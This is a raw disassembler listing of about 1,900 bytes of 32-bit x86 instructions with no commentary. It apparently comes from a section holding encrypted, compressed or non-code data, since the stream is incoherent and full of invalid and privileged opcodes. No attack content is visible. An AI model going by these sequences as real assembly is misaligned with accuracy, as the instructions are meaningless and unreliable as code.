  40f056:	repnz fsub DWORD PTR [edx]
  40f059:	xchg   ebx,eax
  40f05a:	call   0x9d26:0x776ffa0e
  40f061:	xchg   edi,eax
  40f062:	xor    BYTE PTR ds:0x79b47e17,ch
  40f068:	push   ebp
  40f069:	popa   
  40f06a:	rcl    BYTE PTR [ebx+edx*8],cl
  40f06d:	mov    ah,0x80
  40f06f:	xor    DWORD PTR [esp+edi*8],edx
  40f072:	cmp    BYTE PTR [esi+edx*4+0x64],cl
  40f076:	xchg   DWORD PTR [eax+0x3115255e],ebp
  40f07c:	imul   edi,ebp,0xffffffc4
  40f07f:	shl    BYTE PTR fs:[ebx+ebp*8+0x5ac836b7],1
  40f087:	jmp    DWORD PTR [eax-0x62]
  40f08a:	push   edx
  40f08b:	xor    eax,0xebb0f25b
  40f090:	adc    DWORD PTR [ebp-0x16c92acb],eax
  40f096:	xor    esp,DWORD PTR ds:0xfa689915
  40f09c:	xchg   BYTE PTR [eax+ebp*2],bl
  40f09f:	xchg   ecx,eax
  40f0a0:	cdq    
  40f0a1:	mov    eax,ds:0xb02cf404
  40f0a6:	scas   al,BYTE PTR es:[edi]
  40f0a7:	push   ebp
  40f0a8:	mov    al,0xf9
  40f0aa:	int    0x52
  40f0ac:	sub    ch,BYTE PTR [ecx-0x74]
  40f0af:	in     eax,0xa6
  40f0b1:	cwde   
  40f0b2:	push   esp
  40f0b3:	cmp    esi,edx
  40f0b5:	cwde   
  40f0b6:	dec    edx
  40f0b7:	mov    ds:0xe49445f4,eax
  40f0bc:	jle    0x40f04e
  40f0be:	mov    bl,0x5e
  40f0c0:	and    DWORD PTR [ebp+0x74049808],eax
  40f0c6:	pop    ds
  40f0c7:	cli    
  40f0c8:	or     BYTE PTR [ebp-0xcb4cca7],ch
  40f0ce:	sub    esp,0x25
  40f0d1:	sbb    BYTE PTR [ebp-0x7f60c549],ah
  40f0d7:	sub    eax,0x3b2d56fb
  40f0dc:	loopne 0x40f09b
  40f0de:	or     dl,BYTE PTR [esi+0x47df6eda]
  40f0e4:	pop    edx
  40f0e5:	sti    
  40f0e6:	xor    al,BYTE PTR ds:0xf757c1bf
  40f0ec:	(bad)  
  40f0ed:	lahf   
  40f0ee:	nop
  40f0ef:	and    al,BYTE PTR [edx+edi*4-0x55]
  40f0f3:	dec    ebp
  40f0f4:	mov    dh,0x5e
  40f0f6:	cmp    eax,0x1d45b407
  40f0fb:	addr16 mov edx,edi
  40f0fe:	cmp    edx,DWORD PTR [edx-0x1734ea52]
  40f104:	retf   0xfcdf
  40f107:	jns    0x40f09e
  40f109:	pusha  
  40f10a:	xchg   ebx,esp
  40f10c:	push   ds
  40f10d:	into   
  40f10e:	jbe    0x40f10d
  40f110:	(bad)  
  40f111:	sar    DWORD PTR [ecx],0x5b
  40f114:	pop    ds
  40f115:	in     al,dx
  40f116:	test   al,0xe2
  40f118:	push   edi
  40f119:	popa   
  40f11a:	outs   dx,BYTE PTR ds:[esi]
  40f11b:	add    al,0xf
  40f11d:	mov    esp,esp
  40f11f:	fadd   DWORD PTR [eax+0x1]
  40f122:	sub    eax,0x6e8aa2e6
  40f127:	xchg   ebx,eax
  40f128:	js     0x40f121
  40f12a:	cmp    BYTE PTR [edx+0x5665158c],al
  40f130:	fiadd  DWORD PTR [ecx+0x2f]
  40f133:	or     BYTE PTR [esp+eiz*8],dl
  40f136:	pusha  
  40f137:	(bad)
  40f13b:	pop    ebp
  40f13c:	outs   dx,BYTE PTR ds:[esi]
  40f13d:	xor    eax,0x1ec9a186
  40f142:	xor    edi,ebx
  40f144:	lock mov bl,al
  40f147:	lea    ebx,[ebp+0x2c87b248]
  40f14d:	in     eax,0x8d
  40f14f:	(bad)  
  40f150:	mov    al,0x92
  40f152:	pop    eax
  40f153:	adc    bh,BYTE PTR [edx]
  40f155:	pop    esi
  40f156:	add    BYTE PTR [ecx+0x76],0x6d
  40f15a:	inc    ebp
  40f15b:	loope  0x40f10e
  40f15d:	(bad)  
  40f15f:	repnz out 0x77,eax
  40f162:	push   esp
  40f163:	call   0x5ae172df
  40f168:	fisttp DWORD PTR [ecx]
  40f16a:	loop   0x40f172
  40f16c:	jbe    0x40f11b
  40f16e:	xchg   esp,eax
  40f16f:	fwait
  40f170:	aam    0xe7
  40f172:	mov    esp,0x4b1314ef
  40f177:	pop    es
  40f178:	std    
  40f179:	ret    
  40f17a:	sbb    BYTE PTR [eax+edx*1+0x1f],ah
  40f17e:	bound  esp,QWORD PTR [edi]
  40f180:	and    edi,esp
  40f182:	in     eax,dx
  40f183:	mov    edx,0xe47596f1
  40f188:	leave  
  40f189:	imul   ebp,DWORD PTR [ebx-0x7],0x57
  40f18d:	jge    0x40f14a
  40f18f:	mov    ah,BYTE PTR [esp+eax*1]
  40f192:	ins    BYTE PTR es:[edi],dx
  40f193:	pop    esp
  40f194:	sub    DWORD PTR [edi-0x2b],eax
  40f197:	add    BYTE PTR [ebx-0x5c32cb83],0xd2
  40f19e:	inc    ebx
  40f19f:	jb     0x40f1d7
  40f1a1:	(bad)  
  40f1a3:	es aad 0x31
  40f1a6:	scas   eax,DWORD PTR es:[edi]
  40f1a7:	add    eax,DWORD PTR [ebx-0x74]
  40f1aa:	or     BYTE PTR [edi+esi*8],dh
  40f1ad:	xor    DWORD PTR [ecx+ebx*2],0xb7cc960
  40f1b4:	push   ebx
  40f1b5:	sbb    DWORD PTR [edx-0x11],ebp
  40f1b8:	inc    ecx
  40f1b9:	add    DWORD PTR [ecx+esi*8+0x59eb3a28],ebp
  40f1c0:	inc    ebp
  40f1c1:	inc    ecx
  40f1c2:	imul   eax,eax,0xbc46c7fb
  40f1c8:	inc    esi
  40f1c9:	and    eax,0x4c64b25b
  40f1ce:	lods   al,BYTE PTR ds:[esi]
  40f1cf:	aad    0x6b
  40f1d1:	sub    edi,ebx
  40f1d3:	cmp    al,BYTE PTR [ebx-0x831778f]
  40f1d9:	lahf   
  40f1da:	xchg   esi,eax
  40f1db:	(bad)  
  40f1dd:	cmp    ah,BYTE PTR ds:0xf9fd41ee
  40f1e3:	std    
  40f1e4:	retf   
  40f1e5:	hlt    
  40f1e6:	or     esp,DWORD PTR [eax+0x61c10aa0]
  40f1ec:	cmp    BYTE PTR [ebx],dh
  40f1ee:	clc    
  40f1ef:	loop   0x40f17c
  40f1f1:	xchg   ebx,eax
  40f1f2:	push   esp
  40f1f3:	mov    eax,0xeed71616
  40f1f8:	fidivr DWORD PTR [edx]
  40f1fa:	call   0x2a5e:0xb124802a
  40f201:	sub    DWORD PTR [ecx],eax
  40f203:	fadd   QWORD PTR [eax-0x7c]
  40f206:	or     eax,0x33661e3b
  40f20b:	dec    ebx
  40f20c:	loopne 0x40f1be
  40f20e:	or     al,0x4d
  40f210:	rcl    DWORD PTR [edx+ebp*4],1
  40f213:	xor    eax,0xf97831a
  40f218:	push   cs
  40f219:	out    0x8b,eax
  40f21b:	stos   BYTE PTR es:[edi],al
  40f21c:	fstp   QWORD PTR [ecx-0x4d50591]
  40f222:	pushf  
  40f223:	mov    BYTE PTR [ebx+0x26],bh
  40f226:	adc    cl,BYTE PTR [ebx+eiz*8-0x52]
  40f22a:	mov    ebp,0x15e64f30
  40f22f:	add    al,0xff
  40f231:	push   0xffffff9b
  40f233:	or     edx,DWORD PTR [esi]
  40f235:	div    DWORD PTR [eax]
  40f237:	sub    al,cl
  40f239:	retf   0x61f9
  40f23c:	(bad)  
  40f23d:	xchg   esi,eax
  40f23e:	and    DWORD PTR [edx],0x5f
  40f241:	mov    bl,0x18
  40f243:	jmp    0xacec30a5
  40f248:	adc    al,0x32
  40f24a:	sbb    cl,BYTE PTR [ecx+ecx*4]
  40f24d:	dec    edi
  40f24e:	out    dx,eax
  40f24f:	or     DWORD PTR [eax],esi
  40f251:	mov    DWORD PTR [ecx-0x74],ebp
  40f254:	outs   dx,DWORD PTR ds:[esi]
  40f255:	ror    BYTE PTR [ebx-0x28],0x6b
  40f259:	xor    eax,0x7ee1470e
  40f25e:	mov    edx,0xa292231c
  40f263:	retf   
  40f264:	(bad)  
  40f266:	mov    BYTE PTR [edx+0x42d2ae84],ch
  40f26c:	clc    
  40f26d:	mov    ah,0xf2
  40f26f:	xor    DWORD PTR [eax-0xb4a5144],edx
  40f275:	stos   DWORD PTR es:[edi],eax
  40f276:	(bad)
  40f27a:	loopne 0x40f22c
  40f27c:	mov    al,0x7c
  40f27e:	lea    ebx,[edx-0x7262ca62]
  40f284:	xor    eax,0x65056eb
  40f289:	jge    0x40f210
  40f28b:	jns    0x40f306
  40f28d:	adc    eax,0x38865769
  40f292:	push   ecx
  40f293:	call   0xe7634ea
  40f298:	pop    ss
  40f299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f29a:	pop    es
  40f29b:	mov    eax,0x9858c17d
  40f2a0:	int3   
  40f2a1:	shr    BYTE PTR [ebp-0x726380a3],0x8c
  40f2a8:	inc    ebx
  40f2a9:	push   esi
  40f2aa:	call   0xfc0a9cbb
  40f2af:	cmp    DWORD PTR [edi-0x3f13f36f],ecx
  40f2b5:	mov    cl,0x82
  40f2b7:	jne    0x40f267
  40f2b9:	stc    
  40f2ba:	scas   eax,DWORD PTR es:[edi]
  40f2bb:	add    al,BYTE PTR [edi+0x7f]
  40f2be:	dec    edi
  40f2bf:	push   eax
  40f2c0:	or     al,0x5b
  40f2c2:	lds    ebx,FWORD PTR ds:0xb1d63950
  40f2c8:	pop    edi
  40f2c9:	mov    al,0x94
  40f2cb:	sbb    DWORD PTR [esi+edi*2-0x36],edx
  40f2cf:	xchg   esi,eax
  40f2d0:	rcl    DWORD PTR [ebx-0x3bfb5c83],0x66
  40f2d7:	mov    ebx,0xfaab5b4f
  40f2dc:	shl    DWORD PTR [edx+0x1e],1
  40f2df:	pop    ss
  40f2e0:	lahf   
  40f2e1:	call   0x3b7bdc09
  40f2e6:	pop    edx
  40f2e7:	ret    0x4fae
  40f2ea:	add    ebp,ecx
  40f2ec:	mov    ebx,DWORD PTR [eax+0x6b]
  40f2ef:	pop    esi
  40f2f0:	add    al,0x8c
  40f2f2:	push   cs
  40f2f3:	pop    ebp
  40f2f4:	sar    ah,0x9e
  40f2f7:	cmp    al,BYTE PTR [eax]
  40f2f9:	out    dx,eax
  40f2fa:	adc    BYTE PTR [esp+ecx*4-0x42d9a6c7],bl
  40f301:	mov    ax,ds:0xc3f1a56a
  40f307:	xor    dh,dl
  40f309:	ror    BYTE PTR [ebx-0x8],0xd1
  40f30d:	inc    ebp
  40f30e:	popf   
  40f30f:	fst    st(2)
  40f311:	cld    
  40f312:	(bad)  
  40f314:	shl    DWORD PTR [eax-0x57],1
  40f317:	push   es
  40f318:	push   eax
  40f319:	fmul   DWORD PTR [edi+esi*2]
  40f31c:	add    eax,0xdf6a0087
  40f321:	push   ss
  40f322:	pop    ds
  40f323:	jae    0x40f305
  40f325:	outs   dx,BYTE PTR ds:[esi]
  40f326:	stc    
  40f327:	sbb    al,ch
  40f329:	inc    ebp
  40f32a:	xchg   esp,eax
  40f32b:	lahf   
  40f32c:	jmp    0x40f2c8
  40f32e:	cwde   
  40f32f:	es inc eax
  40f331:	hlt    
  40f332:	(bad)  
  40f334:	das    
  40f335:	rcl    DWORD PTR [ebx+0x21e192f],0x50
  40f33c:	leave  
  40f33d:	dec    edx
  40f33e:	sub    ebx,DWORD PTR [ecx-0x3ca02c18]
  40f344:	xchg   DWORD PTR [edi+0x671df9ae],ebp
  40f34a:	cmp    dh,BYTE PTR [esp+esi*4-0x5674d357]
  40f351:	(bad)  
  40f352:	call   0xcef73154
  40f357:	push   es
  40f358:	in     eax,0x35
  40f35a:	push   edi
  40f35b:	fisub  DWORD PTR [eax-0x5b9232fa]
  40f361:	dec    esp
  40f362:	jae    0x40f2fe
  40f364:	(bad)  
  40f365:	aad    0x77
  40f367:	rsm    
  40f369:	(bad)  [edx-0x4a6bcf5]
  40f36f:	push   ebp
  40f370:	sub    ebx,DWORD PTR [esi+ebp*4-0x340b73e0]
  40f377:	jmp    0xee9b:0xd3f591f6
  40f37e:	pop    ebp
  40f37f:	mov    ebp,0x5b5327cf
  40f384:	xor    ecx,ebp
  40f386:	jle    0x40f31b
  40f388:	sub    edx,ebx
  40f38a:	ss enter 0xe3a7,0xce
  40f38f:	mov    edi,0x4d231374
  40f394:	or     esp,DWORD PTR [ebp-0x69b166cd]
  40f39a:	in     al,dx
  40f39b:	jl     0x40f3ec
  40f39d:	push   esi
  40f39e:	ja     0x40f418
  40f3a0:	aas    
  40f3a1:	loop   0x40f40f
  40f3a3:	ins    BYTE PTR es:[edi],dx
  40f3a4:	xchg   ecx,eax
  40f3a5:	aaa    
  40f3a6:	out    0xf7,eax
  40f3a8:	std    
  40f3a9:	test   al,0x9
  40f3ab:	(bad)  
  40f3ac:	stos   BYTE PTR es:[edi],al
  40f3ad:	dec    edi
  40f3ae:	test   BYTE PTR ds:0x81f6deef,ah
  40f3b4:	aas    
  40f3b5:	dec    esi
  40f3b6:	je     0x40f343
  40f3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3b9:	dec    esp
  40f3ba:	js     0x40f418
  40f3bc:	mov    bl,0x2b
  40f3be:	scas   al,BYTE PTR es:[edi]
  40f3bf:	jns    0x40f3b5
  40f3c1:	in     al,dx
  40f3c2:	mov    ch,ch
  40f3c4:	outs   dx,BYTE PTR ds:[esi]
  40f3c5:	pop    eax
  40f3c6:	mov    esp,0x5a7f058b
  40f3cb:	add    esp,DWORD PTR [ebx+0x39]
  40f3ce:	fdiv   DWORD PTR [ebp+edi*1+0x5e]
  40f3d2:	sub    al,BYTE PTR [edx+0x6b417675]
  40f3d8:	pop    ecx
  40f3d9:	dec    ebp
  40f3da:	popf   
  40f3db:	stc    
  40f3dc:	clc    
  40f3dd:	push   cs
  40f3de:	stc    
  40f3df:	xchg   esi,eax
  40f3e0:	mov    WORD PTR [ebx+0x4692d3fd],gs
  40f3e6:	mov    al,ds:0x497f330
  40f3eb:	mov    ch,ah
  40f3ed:	cld    
  40f3ee:	adc    al,0x71
  40f3f0:	loope  0x40f428
  40f3f2:	fcomp  QWORD PTR [edi+ebx*2]
  40f3f5:	pop    es
  40f3f6:	xchg   BYTE PTR [esi],ah
  40f3f8:	pop    ebx
  40f3f9:	jae    0x40f417
  40f3fb:	push   edx
  40f3fc:	jmp    0x40f456
  40f3fe:	dec    eax
  40f3ff:	adc    ebx,DWORD PTR [ebp-0x30005b06]
  40f405:	cwde   
  40f406:	or     BYTE PTR [esi],0x9e
  40f409:	jmp    0x40f44f
  40f40b:	push   edx
  40f40c:	or     al,0xe0
  40f40e:	sti    
  40f40f:	push   ecx
  40f410:	es cwde 
  40f412:	inc    ebx
  40f413:	dec    eax
  40f414:	mov    ebx,0x8f3d0f3a
  40f419:	cli    
  40f41a:	jne    0x40f473
  40f41c:	push   eax
  40f41d:	in     eax,dx
  40f41e:	ins    DWORD PTR es:[edi],dx
  40f41f:	sar    BYTE PTR [eax-0x21],1
  40f422:	ja     0x40f480
  40f424:	cwde   
  40f425:	inc    ecx
  40f426:	aaa    
  40f427:	dec    edi
  40f428:	std    
  40f429:	push   ds
  40f42a:	fsub   st,st(6)
  40f42c:	push   es
  40f42d:	pushf  
  40f42e:	adc    al,0x43
  40f430:	adc    eax,0x5aa437f1
  40f435:	push   edi
  40f436:	mov    WORD PTR [ebx+0x62ce0db5],es
  40f43c:	aad    0x6f
  40f43e:	mov    ds:0x9dd57160,al
  40f443:	xchg   DWORD PTR [esi],eax
  40f445:	add    DWORD PTR [ecx+0x54],ebp
  40f448:	rol    ebx,cl
  40f44a:	and    eax,0x1ec03514
  40f44f:	mov    DWORD PTR [edi+0x1d26c2a2],eax
  40f455:	pop    DWORD PTR [edi+eax*8]
  40f458:	xlat   BYTE PTR ds:[ebx]
  40f459:	int3   
  40f45a:	mov    BYTE PTR [esi-0x15],cl
  40f45d:	mov    ebp,0xc255742b
  40f462:	mov    esi,0x6352e5ce
  40f467:	push   edx
  40f468:	and    eax,0x87bb04cf
  40f46d:	pop    ebx
  40f46e:	inc    ebx
  40f46f:	xchg   BYTE PTR [ebp-0x4b],bh
  40f472:	(bad)  [edi]
  40f474:	shr    BYTE PTR [ebp+0x4e],1
  40f477:	xchg   ebp,eax
  40f478:	data16 mov ds:0x8fb33ef8,al
  40f47e:	gs xchg esp,eax
  40f480:	inc    esi
  40f481:	inc    ebp
  40f482:	fs (bad) 
  40f484:	mov    esp,0xf002fe31
  40f489:	mov    esp,0x10676c37
  40f48e:	test   eax,0xbb6c8cb1
  40f493:	jae    0x40f49d
  40f495:	dec    eax
  40f496:	jae    0x40f4cf
  40f498:	jo     0x40f42b
  40f49a:	retf   0xc873
  40f49d:	inc    eax
  40f49e:	jo     0x40f4f5
  40f4a0:	push   esp
  40f4a1:	pop    ebp
  40f4a2:	push   edi
  40f4a3:	mov    bh,0x2d
  40f4a5:	mov    esi,0xd4cbbf2b
  40f4aa:	inc    ecx
  40f4ab:	cmp    ecx,eax
  40f4ad:	jo     0x40f44c
  40f4af:	jb     0x40f506
  40f4b1:	mov    ah,0x90
  40f4b3:	(bad)  
  40f4b5:	and    al,0x69
  40f4b7:	(bad)  
  40f4b8:	jmp    FWORD PTR [edi+0x189e4326]
  40f4be:	dec    eax
  40f4bf:	rol    DWORD PTR [ebp+0x659424e8],cl
  40f4c5:	stos   DWORD PTR es:[edi],eax
  40f4c6:	and    BYTE PTR [ecx+esi*8-0x6],bh
  40f4ca:	cmp    al,0xaf
  40f4cc:	sbb    DWORD PTR [eax],ebx
  40f4ce:	sub    BYTE PTR [ebx],bl
  40f4d0:	jo     0x40f495
  40f4d2:	mov    ebp,esp
  40f4d4:	pop    esp
  40f4d5:	adc    al,BYTE PTR [ebx-0x379cb0]
  40f4db:	sbb    DWORD PTR [edi],ebp
  40f4dd:	in     eax,0x1
  40f4df:	scas   eax,DWORD PTR es:[edi]
  40f4e0:	add    eax,0xecedc30
  40f4e5:	cmp    al,0xcb
  40f4e7:	test   BYTE PTR [edi+eax*1],dh
  40f4ea:	icebp  
  40f4eb:	or     ax,0xb76f
  40f4ef:	cmp    BYTE PTR [ebx],0xd7
  40f4f2:	or     BYTE PTR [ebp-0x574f30e9],0x87
  40f4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4fa:	out    0x1a,eax
  40f4fc:	jecxz  0x40f48d
  40f4fe:	inc    eax
  40f4ff:	jno    0x40f526
  40f501:	jmp    0x40f4f3
  40f503:	lods   eax,DWORD PTR ds:[esi]
  40f504:	and    ecx,0xffffffe5
  40f507:	sub    eax,ebx
  40f509:	rol    DWORD PTR [eax-0x64b8bdbe],0x4f
  40f510:	ja     0x40f555
  40f512:	int3   
  40f513:	sub    edx,0x68889d35
  40f519:	mov    dl,0xf8
  40f51b:	or     cl,ch
  40f51d:	es in  eax,0xf3
  40f520:	outs   dx,BYTE PTR ds:[esi]
  40f521:	xchg   DWORD PTR [ebx+0x17],edx
  40f524:	mov    edi,0x15b22e11
  40f529:	push   cs
  40f52a:	(bad)  
  40f52b:	retf   
  40f52c:	fistp  WORD PTR [edi+0x64b8791e]
  40f532:	test   DWORD PTR [ebx+0x49],0x38ee79e9
  40f539:	repz dec eax
  40f53b:	daa    
  40f53c:	inc    ecx
  40f53d:	das    
  40f53e:	or     DWORD PTR [esi-0x42],edi
  40f541:	js     0x40f599
  40f543:	xchg   ebx,eax
  40f544:	int    0xed
  40f546:	nop
  40f547:	dec    esi
  40f548:	imul   sp,WORD PTR [edi-0x5bad3688],0x4d
  40f550:	cwde   
  40f551:	loope  0x40f508
  40f553:	data16 aas 
  40f555:	out    dx,eax
  40f556:	stos   DWORD PTR es:[edi],eax
  40f557:	loopne 0x40f520
  40f559:	fsub   DWORD PTR ds:0xbf49aae
  40f55f:	push   eax
  40f560:	retf   0xfd63
  40f563:	or     BYTE PTR fs:[ebp-0x56],dh
  40f567:	dec    eax
  40f568:	cmp    edi,DWORD PTR [eax]
  40f56a:	sub    DWORD PTR [ecx+eiz*8-0x4d4f9055],esi
  40f571:	push   esp
  40f572:	pop    esi
  40f573:	stc    
  40f574:	or     ch,BYTE PTR [esi+0x2004e00e]
  40f57a:	fwait
  40f57b:	add    al,0x60
  40f57d:	push   0x9901bd24
  40f582:	dec    ecx
  40f583:	jae    0x40f505
  40f585:	es (bad) 
  40f587:	dec    ebx
  40f588:	adc    cl,dl
  40f58a:	and    eax,0x6008e1a4
  40f58f:	dec    ebx
  40f590:	mov    dh,0x35
  40f592:	mov    eax,0x59d56268
  40f597:	pushf  
  40f598:	inc    edi
  40f599:	jo     0x40f5a3
  40f59b:	pop    ecx
  40f59c:	imul   ebx,DWORD PTR [ecx],0xffffffd7
  40f59f:	pusha  
  40f5a0:	retf   
  40f5a1:	adc    ah,BYTE PTR [eax+0x1c362492]
  40f5a7:	inc    eax
  40f5a8:	nop
  40f5a9:	xor    eax,eax
  40f5ab:	les    edi,FWORD PTR [edx+ecx*4+0x48e52163]
  40f5b2:	sub    BYTE PTR [eax-0x77],ah
  40f5b5:	inc    edi
  40f5b6:	test   DWORD PTR [edx],0xeb2bc0e1
  40f5bc:	aad    0xa4
  40f5be:	cmp    esi,DWORD PTR [edi]
  40f5c0:	js     0x40f597
  40f5c2:	in     al,dx
  40f5c3:	lock ficom DWORD PTR [ecx-0x37b5859b]
  40f5ca:	imul   DWORD PTR [esi-0x10297205]
  40f5d0:	popf   
  40f5d1:	mov    BYTE PTR [ebp+0x49aff11],ah
  40f5d7:	cld    
  40f5d8:	pop    DWORD PTR cs:[ebp+0x12c811da]
  40f5df:	xchg   eax,eax
  40f5e1:	jg     0x40f5fa
  40f5e3:	leave  
  40f5e4:	xchg   esp,eax
  40f5e5:	ror    DWORD PTR [edi+edx*1],1
  40f5e8:	sub    BYTE PTR [ebx],0x19
  40f5eb:	fisttp WORD PTR [ebx-0x5e4dc7d8]
  40f5f1:	rcl    DWORD PTR [ecx+0x6ff6c7b1],1
  40f5f7:	add    eax,DWORD PTR [edx+0x2036005]
  40f5fd:	imul   ecx,edi,0x7d0e6c2
  40f603:	call   0xe6772fb1
  40f608:	jg     0x40f64c
  40f60a:	push   esp
  40f60b:	pop    eax
  40f60c:	add    DWORD PTR [esi+0x5da7e6e9],0x7bc6bb8b
  40f616:	fst    QWORD PTR [ecx]
  40f618:	or     esi,DWORD PTR [edi+ecx*1+0x29a1eac8]
  40f61f:	(bad)  
  40f620:	int3   
  40f621:	mov    cl,0x1a
  40f623:	sub    ah,BYTE PTR [ecx]
  40f625:	pop    eax
  40f626:	rol    DWORD PTR [edi-0xf],1
  40f629:	push   0x6a495a4e
  40f62e:	lds    edx,FWORD PTR [eax+0x34]
  40f631:	jmp    0x706f:0xa8e43268
  40f638:	imul   edx,DWORD PTR [edx+0x51],0xffffffd4
  40f63c:	fstp   DWORD PTR [edx-0x1b805132]
  40f642:	js     0x40f62a
  40f644:	push   edi
  40f645:	std    
  40f646:	push   ebx
  40f647:	and    eax,0x7d869aad
  40f64c:	icebp  
  40f64d:	loopne 0x40f686
  40f64f:	loope  0x40f632
  40f651:	cmp    al,0x93
  40f653:	sub    cl,bh
  40f655:	outs   dx,BYTE PTR ds:[esi]
  40f656:	outs   dx,DWORD PTR ds:[esi]
  40f657:	pop    ecx
  40f658:	fdiv   st(5),st
  40f65a:	jmp    0x40f6a1
  40f65c:	cmp    bh,BYTE PTR [edx-0x31]
  40f65f:	or     esi,ecx
  40f661:	mov    esi,DWORD PTR [ebp-0x22ab218c]
  40f667:	inc    ecx
  40f668:	das    
  40f669:	mov    cl,0x9a
  40f66b:	jle    0x40f641
  40f66d:	loope  0x40f63f
  40f66f:	enter  0x54f4,0x88
  40f673:	jb     0x40f690
  40f675:	pop    ss
  40f676:	aas    
  40f677:	mov    esp,0x5e0ca7e8
  40f67c:	xchg   ebp,eax
  40f67d:	inc    ebp
  40f67e:	mov    BYTE PTR [ebp+0x177c9820],ch
  40f684:	aas    
  40f685:	ja     0x40f6df
  40f687:	xchg   edi,eax
  40f688:	mov    ah,0x30
  40f68a:	lods   eax,DWORD PTR ds:[esi]
  40f68b:	pop    edx
  40f68c:	icebp  
  40f68d:	xchg   esp,eax
  40f68e:	jp     0x40f6dd
  40f690:	loop   0x40f6a4
  40f692:	aas    
  40f693:	fcomp  QWORD PTR [ebp+0x10]
  40f696:	cmp    ch,0xed
  40f699:	xor    BYTE PTR [edi+eax*2-0x74],0x11
  40f69e:	dec    ebp
  40f69f:	call   0x645f1589
  40f6a4:	sub    eax,0x465c4c5d
  40f6a9:	cdq    
  40f6aa:	sahf   
  40f6ab:	mov    esi,0x282858
  40f6b0:	jb     0x40f6e3
  40f6b2:	push   0x51c4aeba
  40f6b7:	lea    edx,[edx]
  40f6b9:	aas    
  40f6ba:	xlat   BYTE PTR ds:[ebx]
  40f6bb:	or     ebp,DWORD PTR [eax+ecx*8]
  40f6be:	pop    eax
  40f6bf:	icebp  
  40f6c0:	and    eax,0x690b60e2
  40f6c5:	mov    cl,0x5f
  40f6c7:	cmp    BYTE PTR [ebx+eax*4],0xc7
  40f6cb:	std    
  40f6cc:	jnp    0x40f654
  40f6ce:	jp     0x40f6da
  40f6d0:	and    ebx,eax
  40f6d2:	inc    edx
  40f6d3:	iret   
  40f6d4:	enter  0x4b28,0x5b
  40f6d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6d9:	adc    eax,0x656c3a1c
  40f6de:	cmp    bl,BYTE PTR [eax]
  40f6e0:	pop    es
  40f6e1:	fwait
  40f6e2:	mov    esi,0x8a550ecf
  40f6e7:	cs fstp st(1)
  40f6ea:	out    dx,al
  40f6eb:	out    0x85,eax
  40f6ed:	cwde   
  40f6ee:	lds    esp,FWORD PTR [esp+eiz*2+0x5b7d82f]
  40f6f5:	ss call 0xe2d9:0x203036e8
  40f6fd:	div    DWORD PTR [edi-0x6]
  40f700:	adc    al,0x66
  40f702:	jae    0x40f744
  40f704:	jecxz  0x40f77d
  40f706:	or     al,BYTE PTR ds:0xcad96b14
  40f70c:	mov    esi,0xf65b2cd8
  40f711:	and    BYTE PTR [esi+0x8a15412],cl
  40f717:	xor    eax,0x2199a19a
  40f71c:	sar    dh,1
  40f71e:	jp     0x40f71d
  40f720:	das    
  40f721:	jno    0x40f791
  40f723:	xor    edx,esi
  40f725:	adc    dl,BYTE PTR [eax-0x69126207]
  40f72b:	and    BYTE PTR [edi+0x44a5eb01],0x76
  40f732:	data16 fst QWORD PTR [esp+ebx*1]
  40f736:	xchg   esi,eax
  40f737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f738:	dec    esi
  40f739:	ficomp DWORD PTR [esi-0x5c6185c7]
  40f73f:	into   
  40f740:	ss jne 0x40f6dd
  40f743:	rol    edi,cl
  40f745:	dec    edx
  40f746:	xor    al,BYTE PTR [ecx+0x1010f2a5]
  40f74c:	outs   dx,BYTE PTR ds:[esi]
  40f74d:	lea    ebp,[ecx]
  40f74f:	adc    eax,0x5088ecff
  40f754:	and    al,0xd8
  40f756:	sub    eax,0x921a670c
  40f75b:	fcom   QWORD PTR ds:0xbcfc1b63
  40f761:	inc    esi
  40f762:	aam    0xfc
  40f764:	iret   
  40f765:	mov    edx,0xaf5621e5
  40f76a:	ins    BYTE PTR es:[edi],dx
  40f76b:	inc    esp
  40f76c:	lods   eax,DWORD PTR ds:[esi]
  40f76d:	sar    DWORD PTR [ecx-0x39],cl
  40f770:	(bad)  
  40f771:	jmp    0xf5145cb5
  40f776:	inc    ecx
  40f777:	bound  edx,QWORD PTR [esi]
  40f779:	xlat   BYTE PTR ds:[ebx]
  40f77a:	sbb    bh,bl
  40f77c:	lahf   
  40f77d:	or     edx,esi
  40f77f:	adc    dh,BYTE PTR [ebx-0x4b]
  40f782:	frstor [edi+edx*8]
  40f785:	xchg   ebp,eax
  40f786:	out    0xbe,al
  40f788:	xchg   ecx,eax
  40f789:	jae    0x40f71a
  40f78b:	cmp    al,0xd5
  40f78d:	mov    ah,0x4b
  40f78f:	in     eax,dx
  40f790:	xchg   BYTE PTR [esi+0x55],dh
  40f793:	das    
  40f794:	inc    ebp
  40f795:	shl    al,0xcd
  40f798:	cmp    eax,0xbc95dee4
  40f79d:	sub    al,0xf3
  40f79f:	inc    ebp
  40f7a0:	inc    eax
  40f7a1:	jns    0x40f799
  40f7a3:	sbb    DWORD PTR [esi+0x1e],esp
  40f7a6:	sti    
  40f7a7:	bound  sp,DWORD PTR [esi*4+0x1cb36e1f]
  40f7af:	(bad)  
  40f7b0:	xlat   BYTE PTR ds:[ebx]
  40f7b1:	sti    
  40f7b2:	out    0x17,al
  40f7b4:	xor    al,0xc3
  40f7b6:	cmp    ebx,edi
  40f7b8:	aaa    
  40f7b9:	sbb    ebp,esp
  40f7bb:	fwait
  40f7bc:	les    esi,FWORD PTR [edx+0x339eef2a]
  40f7c2:	test   al,0x2a
  40f7c4:	enter  0xcd69,0xfa
  40f7c8:	xchg   edi,eax
  40f7c9:	xor    DWORD PTR [eax],edi
  40f7cb:	out    0xad,eax
  40f7cd:	lods   al,BYTE PTR ds:[esi]
  40f7ce:	pop    ecx
  40f7cf:	cwde   
  40f7d0:	mov    bh,BYTE PTR ds:[ebx+0x79]
  40f7d4:	call   0xa6dd3f6
  40f7d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7da:	push   ss
  40f7db:	xor    BYTE PTR [edi],0xd
  40f7de:	les    eax,FWORD PTR [eax+edx*4-0x41]
  40f7e2:	pop    esp
  40f7e3:	pop    ecx
  40f7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e5:	push   edi
  40f7e6:	mov    esp,0x4c848f16
  40f7eb:	fst    st(3)
